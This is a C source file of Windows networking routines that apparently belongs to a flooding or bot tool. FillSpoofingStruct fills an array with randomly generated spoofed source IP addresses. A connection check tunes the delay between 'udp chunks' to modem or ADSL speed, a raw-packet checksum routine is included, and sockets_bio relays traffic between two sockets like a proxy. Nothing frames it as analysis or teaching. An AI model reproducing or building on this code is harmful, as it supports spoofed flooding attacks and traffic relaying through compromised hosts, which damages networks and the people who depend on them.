#include "StdAfx.h"
#include "extern.h"

int check_inet_state(void)
{
	static HMODULE hinetdll = NULL;
	static PInternetGetConnectedState	statefunc = NULL;
	int		res, con_modem = 0, con_adsl = 0;
	DWORD	state;
	
	if(statefunc == NULL)
	{
		if((hinetdll = LoadLibrary("wininet.dll")) == NULL)
		{
			deb("LoadLibrary for wininet.dll: %s", FORMATERROR);
			return -1;
		}
		deb("loaded library wininet.dll");
		
		statefunc = (PInternetGetConnectedState) GetProcAddress(hinetdll, "InternetGetConnectedState");
		if(statefunc == NULL)
		{
			deb("GetProcAddress: %s", FORMATERROR);
			return -1;
		}
		deb("InternetGetConnectedState is at 0x%p", statefunc);
	}
	
	res = (statefunc)(&state, 0);
	if(inet_alive != res)
	{
		inet_alive = res;
		if(state & INTERNET_CONNECTION_LAN)
			con_adsl = 1;
		if(state & INTERNET_CONNECTION_MODEM || (state & INTERNET_CONNECTION_CONFIGURED &&
			state & INTERNET_CONNECTION_MODEM))
			con_modem = 1;
		udp_chunks_sleep = con_modem ? UDP_CHUNKS_SLEEP_MODEM : UDP_CHUNKS_SLEEP_ADSL;
		deb("selected %s connection, %d ms delay for udp chunks", 
			con_modem ? "modem" : "adsl", udp_chunks_sleep);
		deb("inet_alive => %s", inet_alive ? "YES" : "NO");
	}
	
	
	return inet_alive;
}
WORD LocalIp( void )
{
	if( strstr(GetLocalInetAddr(), "127.0.0.1") || 
		strstr(GetLocalInetAddr(), "192.168.") )
		return TRUE;
	return FALSE;
}

char* GetLocalInetAddr(void)
{
	static char name[255];
	struct hostent *hostinfo;
	WSADATA wsaData;
	
	int iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
	
	if (iResult != NO_ERROR) {
		deb("localaddr: Error at WSAStartup()\n");
	}
	
	if( gethostname ( (char FAR*)name, 255) == 0) {
		if((hostinfo = gethostbyname(name)) != NULL) {
			return(inet_ntoa (*(struct in_addr *)*hostinfo->h_addr_list));
		}
		deb("localaddr: gethostbyname failed, %s",fmterr(WSAGetLastError()) );
	}
	deb("localaddr: gethostname failed, %s",fmterr(WSAGetLastError()) );
	
	return NULL;
}

WORD IsSocketAlive(SOCKET s) 
{
	struct sockaddr_in sin;
	int namelen = sizeof(sin);
	
	if(getpeername(s,(struct sockaddr FAR*)&sin,(int FAR *)&namelen) == SOCKET_ERROR) {
		return WSAGetLastError();
	}
	return SUCCESS;
}

int recv_bytes(SOCKET s)
{
	u_long bytes;
	
	if(ioctlsocket(s,FIONREAD ,&bytes) == SOCKET_ERROR)
		return SOCKET_ERROR;
	return (int)bytes;
}

USHORT checksum(USHORT *buffer, int size)
{
	unsigned long cksum = 0;
	
	while(size > 1) {
		cksum += *buffer++;
		size  -= sizeof(USHORT);   
	}
	
	if(size) {
		cksum += *(UCHAR*)buffer;   
	}
	
	cksum  = (cksum >> 16) + (cksum & 0xffff);
	cksum += (cksum >> 16); 
	
	return (USHORT)( ~cksum ); 
}
void FillSpoofingStruct(void)
{
	SOCKET tmpsock;
	sockaddr_in service;
	char ip[32];
	WORD ri;
	int sas;
	SOCKADDR sa;
	
	spf[0] = inet_addr( GetLocalInetAddr() );
	
	tmpsock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
	service.sin_family = AF_INET;
	service.sin_addr.s_addr = inet_addr(GetLocalInetAddr());
	service.sin_port = htons( rand()%32768 );
	bind( tmpsock, (SOCKADDR*) &service, sizeof(service) ) ;
	
	sas = sizeof(sa);
	memset(&sa, 0, sizeof(sa));
	getsockname(tmpsock, &sa, &sas);
	closesocket(tmpsock);
	/* for speed and CPU saves purposes we filling array with pre-resolved int's */
	for(ri = 1; ri < 253 ; ri ++)
	{
		wsprintf(ip, "%u.%u.%u.%u", (BYTE) sa.sa_data[2], 
			(BYTE) sa.sa_data[3],
			(BYTE) sa.sa_data[4],
			rand()%255);
		spf[ri] = inet_addr(ip);
		//deb("Filled in spoofed addr: %s\n",ip);
	}
}

int sockets_bio(SOCKET first, SOCKET two)
{
	FD_SET fds;
	int a_res, s_res, r_res;
	char bio_buffer[BIO_BUF_SIZE];
	int size_bio_buffer = BIO_BUF_SIZE;
	struct timeval tm;
	
	deb("socket_bio: first %x two %x", first, two);
	
	memset(&tm, 0x0,sizeof(tm));
	tm.tv_sec = BIO_SOCKET_TIMEOUT;

	for(;;) 
	{
		try
		{
			FD_ZERO(&fds);
			FD_SET(first, &fds);
			FD_SET(two, &fds);

			a_res = select(max(first, two), &fds, NULL, NULL, &tm);
			if(a_res == SOCKET_ERROR) 
				break;

			if(FD_ISSET(first,&fds)) 
			{
				s_res = recv(first, bio_buffer, size_bio_buffer - 1,0);
				if(s_res == SOCKET_ERROR || s_res == 0) 
					break;
				r_res = send(two, bio_buffer, s_res, 0);
				if(r_res == SOCKET_ERROR) 
					break;
			} 
			else if(FD_ISSET(two,&fds)) 
			{
				r_res = recv(two, bio_buffer, size_bio_buffer - 1,0);
				if(r_res == SOCKET_ERROR || r_res == 0) 
					break;
				s_res = send(first, bio_buffer, r_res, 0);
				if(s_res == SOCKET_ERROR) 
					break;
			}
		}
		catch(char* msg)
		{
			closesocket(first);
			closesocket(two);
		}
	}
	return 0;
}